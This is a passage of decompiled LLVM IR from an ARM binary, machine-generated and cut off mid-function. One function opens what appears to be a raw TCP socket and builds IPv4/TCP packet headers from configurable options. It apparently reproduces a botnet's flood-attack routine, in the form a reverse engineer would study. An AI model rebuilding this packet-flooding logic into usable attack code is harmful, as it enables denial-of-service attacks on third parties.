  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_be24, i1* %cpsr_z.global-to-local, align 1
  %v1_bf50 = add i32 %v7_bf44, 20
  store i32 %v1_bf50, i32* @r5, align 4
  br i1 %v9_be24, label %dec_label_pc_bf58, label %dec_label_pc_be38

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf38, %dec_label_pc_bdfc
  %v0_bf58 = call i32 @function_fe24()
  %v1_bf58 = trunc i32 %v0_bf58 to i8
  store i32 %v1_b8e8, i32* %lr.global-to-local, align 4
  %v4_bf60 = sdiv i32 %v0_bf58, 256
  store i32 %v4_bf60, i32* %r3.global-to-local, align 4
  store i1 %v2_be3c, i1* %cpsr_z.global-to-local, align 1
  %v3_bf68 = load i32, i32* @r4, align 4
  %v4_bf68 = add i32 %v3_bf68, 4
  %v5_bf68 = inttoptr i32 %v4_bf68 to i8*
  store i8 %v1_bf58, i8* %v5_bf68, align 1
  %v0_bf6c = load i32, i32* %r3.global-to-local, align 4
  %v1_bf6c = trunc i32 %v0_bf6c to i8
  %v2_bf6c = load i32, i32* @r4, align 4
  %v3_bf6c = add i32 %v2_bf6c, 5
  %v4_bf6c = inttoptr i32 %v3_bf6c to i8*
  store i8 %v1_bf6c, i8* %v4_bf6c, align 1
  %v0_bf70 = load i32, i32* @r4, align 4
  %v1_bf70 = add i32 %v0_bf70, 40
  store i32 %v1_bf70, i32* %r0.global-to-local, align 4
  %v0_bf74 = load i32, i32* @sb, align 4
  store i32 %v0_bf74, i32* @r1, align 4
  %v0_bf78 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf78, label %dec_label_pc_be4c, label %dec_label_pc_bf7c

dec_label_pc_bf7c:                                ; preds = %dec_label_pc_be38, %dec_label_pc_bf58
  %v0_bf7c = phi i32 [ %v1_be40, %dec_label_pc_be38 ], [ %v1_bf70, %dec_label_pc_bf58 ]
  %v1_bf7c = inttoptr i32 %v0_bf7c to i8*
  %v2_bf7c = call i32 @function_10000(i8* %v1_bf7c)
  store i32 %v2_bf7c, i32* %r0.global-to-local, align 4
  %v2_be4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_be4c

; uselistorder directives
  uselistorder i32 %v0_bf70, { 1, 0 }
  uselistorder i32 %v7_bf44, { 1, 2, 0 }
  uselistorder i32 %v1_bf2c, { 1, 2, 0 }
  uselistorder i32 %v1_bf28, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_becc, { 0, 2, 1 }
  uselistorder i32 %v0_beb4, { 1, 0, 2 }
  uselistorder i32 %v3_be90, { 1, 0 }
  uselistorder i32 %v3_be70, { 3, 2, 0, 1 }
  uselistorder i32 %v2_be5c, { 0, 2, 1 }
  uselistorder i32 %v0_be40, { 1, 0 }
  uselistorder i32 %v0_bdfc, { 1, 0 }
  uselistorder i32 %v0_bdf0, { 1, 0 }
  uselistorder i1 %v9_be24, { 1, 0, 2, 3 }
  uselistorder i32 %v1_bdd8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bd2c, { 0, 2, 1 }
  uselistorder i32 %v3_bd0c, { 1, 0 }
  uselistorder i32 %v0_bce0, { 1, 0, 2 }
  uselistorder i32 %v3_bcd4, { 1, 0 }
  uselistorder i32 %v3_bc68, { 1, 0 }
  uselistorder i32 %v0_bc5c, { 1, 0 }
  uselistorder i32 %v3_bbe4, { 1, 0 }
  uselistorder i32 %v2_bbd0, { 1, 0 }
  uselistorder i32 %v3_bbb4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_bbac, { 1, 0 }
  uselistorder i32 %v3_bb88, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bb80, { 1, 0 }
  uselistorder i32 %v4_bb68, { 1, 0 }
  uselistorder i32 %v0_bb64, { 0, 2, 1 }
  uselistorder i1 %v7_bad4, { 1, 0 }
  uselistorder i32 %v7_bacc, { 0, 2, 1, 3 }
  uselistorder i32 %v5_bb18, { 1, 0 }
  uselistorder i1 %v9_bafc, { 1, 0 }
  uselistorder i32 %v4_bb10, { 1, 0 }
  uselistorder i32 %v4_bb0c, { 1, 0 }
  uselistorder i32 %v8_ba20, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ba0c, { 1, 0 }
  uselistorder i32 %v0_b9fc, { 2, 0, 1, 3 }
  uselistorder i1 %v7_b984, { 1, 0 }
  uselistorder i32 %v3_b980, { 2, 1, 0, 3 }
  uselistorder i32 %v1_bd98, { 1, 0 }
  uselistorder i32 %v1_bd80, { 1, 0 }
  uselistorder i32 %v1_bd68, { 1, 0 }
  uselistorder i32 %v1_bd50, { 1, 0 }
  uselistorder i32 %v1_bd38, { 1, 0 }
  uselistorder i32 %v5_bb14, { 1, 0 }
  uselistorder i32 %v3_ba6893, { 1, 0 }
  uselistorder i1 %v2_bb2c, { 1, 0 }
  uselistorder i32 %v1_bb28, { 1, 0 }
  uselistorder i32 %v4_bb24, { 2, 0, 1 }
  uselistorder i32 %v4_bb08, { 1, 0 }
  uselistorder i32 %v8_b94c, { 2, 1, 0 }
  uselistorder i32 %v8_b948, { 1, 2, 0 }
  uselistorder i32 %v3_b940, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_b93c, { 0, 1, 3, 2 }
  uselistorder i1 %v7_b930, { 1, 0 }
  uselistorder i1 %v7_b900, { 1, 0 }
  uselistorder i32 %v3_b8fc, { 2, 0, 3, 1 }
  uselistorder i32 %v3_b8f8, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_b8e8, { 1, 3, 2, 0 }
  uselistorder i32 %v1_b890, { 1, 0 }
  uselistorder i32 %v1_b850, { 1, 0 }
  uselistorder i32 %v1_b830, { 1, 0 }
  uselistorder i32 %v1_b810, { 1, 0 }
  uselistorder i32 %v1_b7d8, { 1, 0 }
  uselistorder i32 %v2_b758, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_b748, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_b72c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 19, 12, 13, 14, 15, 16, 17, 18, 23, 20, 21, 22, 24, 26, 25, 28, 27, 31, 29, 32, 33, 30, 34, 36, 35, 37, 38, 40, 39, 44, 41, 42, 43, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_bf7c, { 1, 0 }
  uselistorder label %dec_label_pc_be4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bdd4, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %.thread6, { 2, 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %dec_label_pc_bb5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ba94, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ba44, { 1, 0 }
}

define i32 @function_bf88(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bf88:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_bf8c = urem i32 %arg1, 256
  store i32 %v1_bf8c, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_bfa4 = urem i32 %arg3, 256
  store i32 %v1_bfa4, i32* @r4, align 4
  %v2_bfa8 = call i32 @function_13a94(i32 %v1_bf8c, i32 4)
  %v0_bfac = load i32, i32* @r5, align 4
  store i32 %v0_bfac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bfbc = load i32, i32* @r4, align 4
  %v5_bfc0 = inttoptr i32 %v0_bfac to i32*
  %v6_bfc0 = call i32 @function_a4e8(i32 %v0_bfbc, i32* %v5_bfc0, i32 2, i32 0)
  %v1_bfcc = urem i32 %v6_bfc0, 256
  store i32 %v1_bfcc, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bfd8 = load i32, i32* @r5, align 4
  store i32 %v0_bfd8, i32* %r1.global-to-local, align 4
  %v0_bfdc = load i32, i32* @r4, align 4
  %v5_bfe0 = trunc i32 %v6_bfc0 to i8
  %v6_bfe4 = inttoptr i32 %v0_bfd8 to i32*
  %v7_bfe4 = call i32 @function_a4e8(i32 %v0_bfdc, i32* %v6_bfe4, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_bfe8 = load i32, i32* @r5, align 4
  store i32 %v0_bfe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bfe4, i32* @r8, align 4
  %v0_bff8 = load i32, i32* @r4, align 4
  %v4_bffc = inttoptr i32 %v0_bfe8 to i32*
  %v5_bffc = call i32 @function_a4e8(i32 %v0_bff8, i32* %v4_bffc, i32 4, i32 64)
  %v1_c004 = urem i32 %v5_bffc, 256
  store i32 %v1_c004, i32* %ip.global-to-local, align 4
  %v0_c008 = load i32, i32* @r5, align 4
  store i32 %v0_c008, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c014 = load i32, i32* @r4, align 4
  %v6_c01c = inttoptr i32 %v0_c008 to i32*
  %v7_c01c = call i32 @function_a4e8(i32 %v0_c014, i32* %v6_c01c, i32 5, i32 0)
  %v1_c028 = urem i32 %v7_c01c, 256
  store i32 %v1_c028, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c034 = load i32, i32* @r5, align 4
  store i32 %v0_c034, i32* %r1.global-to-local, align 4
  %v0_c038 = load i32, i32* @r4, align 4
  %v5_c040 = inttoptr i32 %v0_c034 to i32*
  %v6_c040 = call i32 @function_a4e8(i32 %v0_c038, i32* %v5_c040, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c048 = load i32, i32* @r5, align 4
  store i32 %v0_c048, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c040, i32* @r7, align 4
  %v0_c058 = load i32, i32* @r4, align 4
  %v4_c05c = inttoptr i32 %v0_c048 to i32*
  %v5_c05c = call i32 @function_a4e8(i32 %v0_c058, i32* %v4_c05c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c064 = load i32, i32* @r5, align 4
  store i32 %v0_c064, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c05c, i32* @r6, align 4
  %v0_c074 = load i32, i32* @r4, align 4
  %v4_c078 = inttoptr i32 %v0_c064 to i32*
  %v5_c078 = call i32 @function_a4e8(i32 %v0_c074, i32* %v4_c078, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c084 = load i32, i32* @r5, align 4
  store i32 %v0_c084, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_c090 = load i32, i32* @r4, align 4
  %v5_c094 = inttoptr i32 %v0_c084 to i32*
  %v6_c094 = call i32 @function_a4e8(i32 %v0_c090, i32* %v5_c094, i32 18, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c098 = load i32, i32* @r5, align 4
  store i32 %v0_c098, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0a8 = load i32, i32* @r4, align 4
  %v5_c0ac = inttoptr i32 %v0_c098 to i32*
  %v6_c0ac = call i32 @function_a4e8(i32 %v0_c0a8, i32* %v5_c0ac, i32 11, i32 0)
  %v0_c0b0 = load i32, i32* @r5, align 4
  store i32 %v0_c0b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c0c0 = load i32, i32* @r4, align 4
  %v5_c0c4 = inttoptr i32 %v0_c0b0 to i32*
  %v6_c0c4 = call i32 @function_a4e8(i32 %v0_c0c0, i32* %v5_c0c4, i32 12, i32 1)
  %v0_c0c8 = load i32, i32* @r5, align 4
  store i32 %v0_c0c8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0d8 = load i32, i32* @r4, align 4
  %v5_c0dc = inttoptr i32 %v0_c0c8 to i32*
  %v6_c0dc = call i32 @function_a4e8(i32 %v0_c0d8, i32* %v5_c0dc, i32 13, i32 0)
  %v0_c0e0 = load i32, i32* @r5, align 4
  store i32 %v0_c0e0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0f0 = load i32, i32* @r4, align 4
  %v5_c0f4 = inttoptr i32 %v0_c0e0 to i32*
  %v6_c0f4 = call i32 @function_a4e8(i32 %v0_c0f0, i32* %v5_c0f4, i32 14, i32 0)
  %v0_c0f8 = load i32, i32* @r5, align 4
  store i32 %v0_c0f8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c108 = load i32, i32* @r4, align 4
  %v5_c10c = inttoptr i32 %v0_c0f8 to i32*
  %v6_c10c = call i32 @function_a4e8(i32 %v0_c108, i32* %v5_c10c, i32 15, i32 0)
  %v0_c110 = load i32, i32* @r5, align 4
  store i32 %v0_c110, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c120 = load i32, i32* @r4, align 4
  %v5_c124 = inttoptr i32 %v0_c110 to i32*
  %v6_c124 = call i32 @function_a4e8(i32 %v0_c120, i32* %v5_c124, i32 16, i32 0)
  %v0_c128 = load i32, i32* @r5, align 4
  store i32 %v0_c128, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_c138 = load i32, i32* @r4, align 4
  %v5_c13c = inttoptr i32 %v0_c128 to i32*
  %v6_c13c = call i32 @function_a4e8(i32 %v0_c138, i32* %v5_c13c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c14c = load i32, i32* @r5, align 4
  store i32 %v0_c14c, i32* %r1.global-to-local, align 4
  %v0_c150 = load i32, i32* @r4, align 4
  %v4_c154 = inttoptr i32 %v0_c14c to i32*
  %v5_c154 = call i32 @function_a4e8(i32 %v0_c150, i32* %v4_c154, i32 1, i32 1)
  %v2_c160 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_c160, i32* %r3.global-to-local, align 4
  %v1_c164 = urem i32 %v5_c154, 256
  store i32 %v1_c164, i32* %ip.global-to-local, align 4
  %v0_c168 = load i32, i32* @r5, align 4
  store i32 %v0_c168, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c170 = load i32, i32* @r4, align 4
  %v5_c178 = inttoptr i32 %v0_c168 to i32*
  %v6_c178 = call i32 @function_a47c(i32 %v0_c170, i32* %v5_c178, i32 25, i32 %v2_c160, i32 %v1_c164)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c18c = call i32 @function_13790(i32 2, i32 3, i32 6)
  %v7_c190 = icmp eq i32 %v3_c18c, -1
  store i1 %v7_c190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c190, label %dec_label_pc_c5c8, label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_bf88
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c1a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c1a4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c1b8 = call i32 @function_13760(i32 %v3_c18c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v7_c1bc = icmp eq i32 %v6_c1b8, -1
  store i1 %v7_c1bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c1bc, label %dec_label_pc_c5c0, label %dec_label_pc_c1c4

dec_label_pc_c1c4:                                ; preds = %dec_label_pc_c19c
  %v0_c1c4 = load i32, i32* @r8, align 4
  %v0_c1c8 = load i32, i32* @r7, align 4
  %v0_c1cc = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c1d4 = urem i32 %v0_c1c4, 65536
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  %v3_c1d8 = urem i32 %v0_c1c8, 65536
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v3_c1dc = urem i32 %v0_c1cc, 65536
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v0_c1e0 = load i32, i32* @fp, align 4
  %v2_c1e0 = icmp eq i32 %v0_c1e0, 0
  store i1 %v2_c1e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp75 = icmp slt i32 %v0_c1e0, 1
  br i1 %tmp75, label %dec_label_pc_c6e0, label %dec_label_pc_c1f8

dec_label_pc_c1f8:                                ; preds = %dec_label_pc_c1c4
  %v1_c200 = add i32 %v6_c13c, 40
  %tmp76 = mul i32 %v1_c200, 256
  %v1_c214 = urem i32 %v0_c1c8, 256
  %v1_c218 = and i32 %tmp76, 65280
  %v3_c21c = mul nuw nsw i32 %v1_c214, 256
  %v1_c224 = urem i32 %v0_c1cc, 256
  %tmp77 = udiv i32 %v0_c1cc, 256
  %v3_c228 = urem i32 %tmp77, 256
  %tmp78 = udiv i32 %v1_c200, 256
  %v4_c22c = urem i32 %tmp78, 256
  %v5_c22c = or i32 %v4_c22c, %v1_c218
  store i32 %v5_c22c, i32* @lr, align 4
  %tmp79 = udiv i32 %v0_c1c8, 256
  %v4_c230 = urem i32 %tmp79, 256
  %v5_c230 = or i32 %v4_c230, %v3_c21c
  store i32 %v5_c230, i32* @sl, align 4
  %v4_c234 = mul nuw nsw i32 %v1_c224, 256
  %v5_c234 = or i32 %v4_c234, %v3_c228
  store i32 %v5_c234, i32* @r6, align 4
  %tmp80 = udiv i32 %v0_c1c4, 256
  %v3_c244 = urem i32 %tmp80, 256
  %v1_c248 = urem i32 %v0_c1c4, 256
  %tmp81 = mul i32 %v5_c078, 256
  %v1_c250 = and i32 %tmp81, 65280
  %v1_c254 = urem i32 %v6_c0ac, 2
  %v1_c258 = urem i32 %v6_c0c4, 2
  %v1_c25c = urem i32 %v6_c0dc, 2
  %tmp82 = udiv i32 %v5_c078, 256
  %v4_c260 = urem i32 %tmp82, 256
  %v5_c260 = or i32 %v4_c260, %v1_c250
  store i32 %v5_c260, i32* @r8, align 4
  %v1_c280 = urem i32 %v6_c0f4, 2
  %v1_c284 = urem i32 %v6_c10c, 2
  %v1_c288 = urem i32 %v6_c124, 2
  %v1_c28c = urem i32 %v6_c0dc, 256
  %v4_c290 = mul nuw nsw i32 %v1_c248, 256
  %v5_c290 = or i32 %v4_c290, %v3_c244
  store i32 %v5_c290, i32* @r5, align 4
  %v3_c2a425 = udiv i32 %v1_c218, 256
  store i32 %v3_c2a425, i32* %r3.global-to-local, align 4
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  store i32 %v1_c214, i32* %r1.global-to-local, align 4
  store i32 %v1_c224, i32* %r2.global-to-local, align 4
  %v5_c2c0 = trunc i32 %v0_c1c8 to i8
  store i32 0, i32* @r4, align 4
  %sext8 = mul i32 %v5_bffc, 16777216
  %v4_c31c = sdiv i32 %sext8, 16777216
  %sext9 = mul i32 %v0_c1c4, 16777216
  %v4_c328 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %tmp78, 16777216
  %v4_c33c = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %v1_c200, 16777216
  %v4_c340 = sdiv i32 %sext11, 16777216
  %tmp = sub nsw i32 0, %v1_c254
  %v4_c390 = and i32 %tmp, 32
  %tmp93 = sub nsw i32 0, %v1_c258
  %v4_c3a4 = and i32 %tmp93, 16
  %tmp94 = sub nsw i32 0, %v1_c25c
  %v4_c3b8 = and i32 %tmp94, 8
  %tmp95 = sub nsw i32 0, %v1_c280
  %v4_c3cc = and i32 %tmp95, 4
  %tmp96 = sub nsw i32 0, %v1_c284
  %v3_c3e0 = and i32 %tmp96, 2
  %sext12 = mul i32 %v0_c1cc, 16777216
  %v7_c410 = sdiv i32 %sext12, 16777216
  %v1_c324 = trunc i32 %v4_c31c to i8
  %extract.t = trunc i32 %v4_c328 to i8
  %v3_c410 = sext i8 %v5_c2c0 to i32
  %v2_c434 = icmp eq i32 %v1_c28c, 0
  br label %dec_label_pc_c2cc

dec_label_pc_c2cc:                                ; preds = %bb89, %dec_label_pc_c1f8
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c2d8 = call i32 @function_13a94(i32 1510, i32 1)
  store i32 %v2_bfa8, i32* %ip.global-to-local, align 4
  %v2_c2e4 = load i32, i32* @r4, align 4
  %v5_c2e4 = mul i32 %v2_c2e4, 4
  %v6_c2e4 = add i32 %v5_c2e4, %v2_bfa8
  %v7_c2e4 = inttoptr i32 %v6_c2e4 to i32*
  store i32 %v2_c2d8, i32* %v7_c2e4, align 4
  %v3_c2e8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c2e8, i32* %r3.global-to-local, align 4
  %v0_c2ec = load i32, i32* %ip.global-to-local, align 4
  %v4_c2ec = mul i32 %v3_c2e8, 4
  %v5_c2ec = add i32 %v0_c2ec, %v4_c2ec
  %v6_c2ec = inttoptr i32 %v5_c2ec to i32*
  %v7_c2ec = load i32, i32* %v6_c2ec, align 4
  store i32 %v7_c2ec, i32* @r7, align 4
  %v1_c2f0 = inttoptr i32 %v7_c2ec to i8*
  %v2_c2f0 = load i8, i8* %v1_c2f0, align 1
  %tmp97 = urem i8 %v2_c2f0, 16
  %v1_c2f4 = zext i8 %tmp97 to i32
  %v1_c2f8 = or i32 %v1_c2f4, 64
  store i32 %v1_c2f8, i32* %r2.global-to-local, align 4
  %v1_c2fc = trunc i32 %v1_c2f8 to i8
  store i8 %v1_c2fc, i8* %v1_c2f0, align 1
  %v0_c300 = load i32, i32* @r7, align 4
  %v1_c300 = inttoptr i32 %v0_c300 to i8*
  %v2_c300 = load i8, i8* %v1_c300, align 1
  %v1_c304 = and i8 %v2_c300, -16
  %v1_c308 = or i8 %v1_c304, 5
  store i32 %v1_c028, i32* %r1.global-to-local, align 4
  store i8 %v1_c308, i8* %v1_c300, align 1
  %v2_c318 = load i32, i32* @r7, align 4
  %v3_c318 = add i32 %v2_c318, 1
  %v4_c318 = inttoptr i32 %v3_c318 to i8*
  store i8 %v5_bfe0, i8* %v4_c318, align 1
  store i32 %v4_c31c, i32* %r3.global-to-local, align 4
  %v0_c320 = load i32, i32* %r1.global-to-local, align 4
  %v2_c320 = icmp eq i32 %v0_c320, 0
  store i1 %v2_c320, i1* %cpsr_z.global-to-local, align 1
  %v2_c324 = load i32, i32* @r7, align 4
  %v3_c324 = add i32 %v2_c324, 8
  %v4_c324 = inttoptr i32 %v3_c324 to i8*
  store i8 %v1_c324, i8* %v4_c324, align 1
  store i32 %v4_c328, i32* %r2.global-to-local, align 4
  %v0_c32c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c32c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c2cc
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c330 = load i32, i32* @r7, align 4
  %v4_c330 = add i32 %v3_c330, 6
  %v5_c330 = inttoptr i32 %v4_c330 to i8*
  store i8 64, i8* %v5_c330, align 1
  %v0_c338.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t26 = trunc i32 %v0_c338.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c2cc, %bb
  %v0_c338.off0 = phi i8 [ %extract.t, %dec_label_pc_c2cc ], [ %extract.t26, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_c338 = load i32, i32* @r7, align 4
  %v3_c338 = add i32 %v2_c338, 5
  %v4_c338 = inttoptr i32 %v3_c338 to i8*
  store i8 %v0_c338.off0, i8* %v4_c338, align 1
  store i32 %v4_c33c, i32* %ip.global-to-local, align 4
  store i32 %v4_c340, i32* %r1.global-to-local, align 4
  %v0_c344 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c344, label %bb84, label %bb83

bb83:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %.thread, %bb83
  %v0_c348 = load i32, i32* %r3.global-to-local, align 4
  %v1_c348 = trunc i32 %v0_c348 to i8
  %v2_c348 = load i32, i32* @r7, align 4
  %v3_c348 = add i32 %v2_c348, 9
  %v4_c348 = inttoptr i32 %v3_c348 to i8*
  store i8 %v1_c348, i8* %v4_c348, align 1
  %v0_c34c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c34c, label %bb86, label %bb85

bb85:                                             ; preds = %bb84
  %v1_c34c = load i32, i32* %r2.global-to-local, align 4
  %v2_c34c = trunc i32 %v1_c34c to i8
  %v3_c34c = load i32, i32* @r7, align 4
  %v4_c34c = add i32 %v3_c34c, 7
  %v5_c34c = inttoptr i32 %v4_c34c to i8*
  store i8 %v2_c34c, i8* %v5_c34c, align 1
  br label %bb86

bb86:                                             ; preds = %bb84, %bb85
  %v3_c350 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c350, i32* %r2.global-to-local, align 4
  %v0_c354 = load i32, i32* %ip.global-to-local, align 4
  %v1_c354 = trunc i32 %v0_c354 to i8
  %v2_c354 = load i32, i32* @r7, align 4
  %v3_c354 = add i32 %v2_c354, 2
  %v4_c354 = inttoptr i32 %v3_c354 to i8*
  store i8 %v1_c354, i8* %v4_c354, align 1
  store i32 %v6_c178, i32* %ip.global-to-local, align 4
  %v0_c35c = load i32, i32* %r2.global-to-local, align 4
  %v3_c35c = mul i32 %v0_c35c, 32
  store i32 %v3_c35c, i32* %r3.global-to-local, align 4
  %v1_c360 = load i32, i32* @r7, align 4
  %v2_c360 = add i32 %v1_c360, 12
  %v3_c360 = inttoptr i32 %v2_c360 to i32*
  store i32 %v6_c178, i32* %v3_c360, align 4
  %v0_c364 = load i32, i32* %r3.global-to-local, align 4
  %v1_c364 = load i32, i32* %r2.global-to-local, align 4
  %tmp98 = mul i32 %v1_c364, -8
